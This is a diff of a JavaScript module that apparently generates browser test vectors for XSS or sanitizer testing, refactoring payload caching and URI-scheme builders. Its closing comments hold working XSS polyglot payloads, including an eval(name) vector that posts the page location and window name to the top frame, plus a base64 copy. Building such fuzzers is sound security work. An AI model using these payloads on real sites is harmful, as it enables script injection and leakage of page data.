@@ -1,7 +1,8 @@
-var Producer = (function() {
+var ProducerModule = (function() {
   var producer = {};
 
   var mediaCache = {};
+  var dataURICache = {};
 
   var tagTemplates = {
     /* a dictionary of "capability" names and examples to exercise them.
@@ -69,42 +70,21 @@ var Producer = (function() {
   function typeToPath(resType) {
     // Category: payload (real content) or a url.
     // Type: content-type, either type/subtype or just type, not "type/*".
-    var res = {
-      'text/html': 'samples/sample.html',
-      'text/html': 'samples/sample.txt',
-      'text/javascript': 'samples/sample.js',
-      'text/css': 'samples/sample.css',
-      'application/font-woff': 'samples/brankovic.ttf',
-      // images
-      'image/svg+xml': 'samples/sample.svg',
-      'image/gif':'samples/sample.gif',
-      'image/jpeg': 'samples/samples.jpg', // ??
-      'image/jpg': 'samples/samples.jpg',
-      'image/png': 'samples/sample.png',
-      'video/mp4': 'samples/sample.mp4',
-      'video/ogg': 'samples/sample.ogv',
-      'audio/mpeg': 'samples/sample.mp3',
-      'audio/ogg': 'samples/sample.ogg',
-      // more to follow... :)
-      /* suggestions:
-       application/xml, jar (application/x-compressed,application/java-archivemime-type)
-       */
-    };
     if (resType == '') {
       // most capable or random? :/
-      return res[choice(Object.keys(res))]; //res['text/html'];
+      return CONFIG.res[choice(Object.keys(CONFIG.res))]; //res['text/html'];
     }
     if (resType.indexOf("/") == -1) { // have to search through keys... most capable or random? tricky :<
       var list = []
-      for (var key in res) {
+      for (var key in CONFIG.res) {
         var majorType = key.split("/")[0];
         if (majorType.indexOf(resType) == 0) {
-          list.push(res[key]);
+          list.push(CONFIG.res[key]);
         }
       }
       return choice(list); // random.
     }
-    else if (resType in res) { return res[resType]; }
+    else if (resType in CONFIG.res) { return CONFIG.res[resType]; }
     else { throw new Error("There was no resource found to satisfy this content type:" + resType); }
   }
 
@@ -137,19 +117,21 @@ var Producer = (function() {
           // this might loop a few times, if the gods of randomness are not with us.
           return makeURL(type);
         }
-        var blob = makePayloadAsBlob(path);
-        var reader = new FileReader();
-        var jsString;
-        reader.onload = function(e) { jsString = e.target.result; };
-        reader.readAsText(blob);
-
-        return 'javascript:' + jsString;
+        var content = makePayload(path);
+        return 'javascript:' + content;
       },
-      /* 'data:': function(path, type) {
-       //TODO: think about how to make this fall-back to b64 if binary data are there...
-       return 'data:' +type+ ',' + makePayloadAsBlob(path);
-       }, */
-      'data-base64': function(path, type) { return 'data:' +type+ ';base64,' + btoa(makePayloadAsBlob(path));  },
+      'data:': function(path, type) {
+        if (type.indexOf('text') !== 0) { return makeURL(type); } // fallback for non-text content
+       return 'data:' +type+ ',' + makePayload(path);
+       },
+      'data-base64': function(path, type) {
+        if (path in dataURICache) {
+          return dataURICache[path];
+        } else {
+          console.log("couldn't find cached data URI for path. Falling back to other URI scheme");
+          return makeURL(type);
+        }
+      },
       'http': function(path, type) { return 'http://' + CONFIG.host + '/' + CONFIG.path + '/' + path;  },
       // TODO add https
     }
@@ -163,23 +145,11 @@ var Producer = (function() {
     //return URL_LAYERS['http'](path, contenttype);
     return URL_LAYERS[choice(Object.keys(URL_LAYERS))](path, contenttype);
   }
-  function makePayloadAsBlob(path) {
+  function makePayload(path) {
     if (path in mediaCache) {
       return mediaCache[path];
-    }
-    if (typeof require !== "undefined") {
-      var fs = require("fs");
-      var content = fs.readFileSync(path);
-      mediaCache[path] = content;
-      return content;
     } else {
-      var xhr = new XMLHttpRequest();
-      var result;
-      xhr.open("GET", path, false); //hackish: synchronous xhr
-      xhr.send();
-      var content = xhr.response;
-      mediaCache[path] = content;
-      return new Blob([content]);
+      throw new Error("Couldnt find media at "+path);
     }
   }
   function resolveResource(arr) {
@@ -191,7 +161,7 @@ var Producer = (function() {
     }
     else if (resMethod == "X-payload") {
       var path = typeToPath(typ);
-      return makePayloadAsBlob(path);
+      return makePayload(path);
     }
   }
 
@@ -243,18 +213,72 @@ var Producer = (function() {
     do {
       newVector = exerciseCapability(cap);
       tries++;
-      if (tries > 50) { console.log("I failed to make a new vector. I tried a lot. Quitting."); throw new Error(); }
+      if (tries > 100) {
+        var s="I failed to make a new vector. I tried a lot. Quitting."
+        console.log(s); throw new Error(s);
+      }
     } while (newVector in tested);
     tested[newVector] = true;
     return newVector;
   }
 
+  // Initialize
+  function init() {
+    function cachePath(path) {
+      if (typeof require !== "undefined") {
 
+        var fs = require("fs");
+
+        var content = fs.readFileSync(path);
+        mediaCache[path] = content;
+        // fyou nodejs., this doesn't work. :<
+        /*var content = fs.readFile(path, {encoding: 'ucs2'}, function (err, data) {
+         if (err) throw err;
+         mediaCache[path] = content;
+         callback(content);
+         });*/
+
+      } else {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", path, true);
+        xhr.responseType = "blob";
+        xhr.onload = function(e) {
+          var blob = xhr.response;
+          var reader = new FileReader();
+          reader.onload = function(e) {
+            jsString = e.target.result; // blob content
+            mediaCache[path] = jsString;
+          };// end reader.onload
+          reader.readAsText(blob);
+          // again for base 64:
+          var reader64 = new FileReader();
+          reader64.onload = function(e) {
+            dataURICache[path] = e.target.result;
+          }
+          reader64.readAsDataURL(blob);
+        };// end xhr.onload
+        xhr.send();
+      }
+    }
+    // get all paths:
+    for (var k in CONFIG.res) {
+      cachePath(CONFIG.res[k]);
+    }
+  }
+  init();
 
   producer.exerciseCapability = exerciseCapability;
   producer.exerciseNewCapability = exerciseNewCapability;
+  producer.typeToPath = typeToPath
+  producer.makeURL = makeURL
+  producer.makePayload = makePayload
+  producer.resolveResource = resolveResource
+  producer.templateToHTML = templateToHTML
+  producer.mediaCache = mediaCache;
+  producer.dataURICache = dataURICache;
   return producer;
-})();
+})
+//TODO
 // cool vector I just thought of: -->"; alert("<script>alert(1)</script>");//
 // works in comment, script and pure html. not in any tag or style though.
 // see also "one vector to rule them all".
@@ -262,3 +286,4 @@ var Producer = (function() {
 // javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=top.postMessage([window.location.href,window.name],/\*/.source.slice(1))]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=top.postMessage([window.location.href,window.name],/\*/.source.slice(1)) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
 // == atob("amF2YXNjcmlwdDovKi0tPl1dPiU+Pz48L3NjcmlwdD48L3RpdGxlPjwvdGV4dGFyZWE+PC9ub3NjcmlwdD48L3N0eWxlPjwveG1wPiI+W2ltZz0xLG5hbWU9dG9wLnBvc3RNZXNzYWdlKFt3aW5kb3cubG9jYXRpb24uaHJlZix3aW5kb3cubmFtZV0sL1wqLy5zb3VyY2Uuc2xpY2UoMSkpXTxpbWcgLS9zdHlsZT1hOmV4cHJlc3Npb24mIzQwJiM0NyYjNDInLy0vKiYjMzksLyoqL2V2YWwobmFtZSkvKiUyQS8vLyovLy8mIzQxOzt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlOy1tcy1iZWhhdmlvcjp1cmwoI2RlZmF1bHQjdGltZTIpIG5hbWU9dG9wLnBvc3RNZXNzYWdlKFt3aW5kb3cubG9jYXRpb24uaHJlZix3aW5kb3cubmFtZV0sL1wqLy5zb3VyY2Uuc2xpY2UoMSkpIG9uZXJyb3I9ZXZhbChuYW1lKSBzcmM9MSBhdXRvZm9jdXMgb25mb2N1cz1ldmFsKG5hbWUpIG9uY2xpY2s9ZXZhbChuYW1lKSBvbm1vdXNlb3Zlcj1ldmFsKG5hbWUpIG9uYmVnaW49ZXZhbChuYW1lKSBiYWNrZ3JvdW5kPWphdmFzY3JpcHQ6ZXZhbChuYW1lKS8vPiI=");
 //
+
